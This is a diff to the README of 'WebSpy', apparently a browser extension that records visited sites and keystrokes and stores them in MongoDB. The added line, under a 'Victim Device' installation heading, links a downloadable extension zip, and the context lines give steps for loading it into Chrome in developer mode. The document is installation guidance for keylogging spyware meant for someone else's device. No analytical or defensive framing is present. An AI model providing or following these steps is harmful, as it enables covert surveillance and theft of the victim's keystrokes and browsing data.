@@ -11,6 +11,7 @@ A Browser Extension to detect the site and key strokes, store the data in mongoD
 
 ## Installation
 ### Victim Device:
+  - Download the extension zip file [extn.zip](https://github.com/3rr0r-505/WebSpy/raw/main/extn.zip) and extract the zip file.
   - Load the extension into Chrome:-
       - Open Google Chrome and go to `chrome://extensions/`.
       - Enable `Developer Mode` by toggling the switch in the top right corner.
